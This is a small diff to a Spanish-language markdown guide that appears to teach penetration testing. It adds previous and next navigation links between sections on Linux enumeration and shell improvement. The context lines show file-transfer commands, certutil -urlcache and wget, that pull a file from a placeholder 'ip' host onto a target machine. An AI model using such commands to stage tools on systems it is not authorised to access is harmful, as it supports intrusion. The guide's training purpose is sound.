@@ -39,3 +39,5 @@ C: > certutil -urlcache -f http://ip/archivo archivo_guardado
 ```bash
 usr@hostname# wget http://ip/archivo
 ```
+
+[⟵ Anterior](03_linux_enum.md) | [Siguiente ⟶](05_mejora_shell.md)
